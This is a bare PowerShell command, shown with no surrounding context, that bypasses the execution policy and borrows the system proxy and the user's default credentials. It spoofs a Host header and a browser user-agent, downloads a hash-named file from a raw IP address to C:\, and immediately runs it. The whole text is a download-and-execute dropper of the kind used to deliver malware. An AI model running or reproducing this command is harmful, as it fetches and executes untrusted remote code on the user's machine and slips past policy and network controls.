powershell -exec bypass -c
$u="https://88.198.222.90/file/sample/6317a573893bde4aeea7e18e/";
$p=[System.Net.WebRequest]::GetSystemWebProxy();
$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
$w=New-Object net.webclient;
$w.Headers.add('Host','hacktree.org')
$w.Headers.add('user-agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;')
$w.proxy=$p;
$w.UseDefaultCredentials=$true;
$s=$w.DownloadFile($u,"C:\9fae5d148b89001555132c896879652fe1ca633d35271db34622248e048c78ae.apk");Start-Process "C:\9fae5d148b89001555132c896879652fe1ca633d35271db34622248e048c78ae.apk";